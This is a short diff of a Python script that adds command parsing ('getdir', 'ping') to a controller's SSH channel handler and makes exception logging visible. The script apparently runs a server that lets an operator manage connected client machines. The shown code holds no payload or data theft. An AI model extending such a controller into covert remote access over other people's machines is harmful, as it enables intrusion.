@@ -73,7 +73,15 @@ def client_handler(client_no):
 
 def contr_handler(contr_ssh_session, contr_ssh_channel):
     while not contr_ssh_channel.closed:
-        contr_ssh_channel.send(contr_ssh_channel.recv(1024).decode('utf-8'))
+        command = contr_ssh_channel.recv(1024).decode('utf-8').split(" ")
+        if command[0] == "getdir" and len(command[1]):
+            try: contr_ssh_channel.send(get_client_path(int(command[1])))
+            except IndexError:
+                contr_ssh_channel.send("[SERVER] Invalid Client\n")
+        elif command[0] == "ping":
+            contr_ssh_channel.send("[SERVER] pong")
+        else:
+            contr_ssh_channel.send("[SERVER] Invalid command")
 
 def exit_client_sessions():
     for client in connected_clients[:]:
@@ -182,7 +190,7 @@ def controller():
             # print("[*] SSH session closed")
             sys.exit()
         except Exception as err:
-            # print("[*] Caught Exception: ", str(err))
+            print("[!] Caught Exception: ", type(err), str(err))
             # print("[*] Exiting Script")
             try:
                 contr_ssh_session.close()
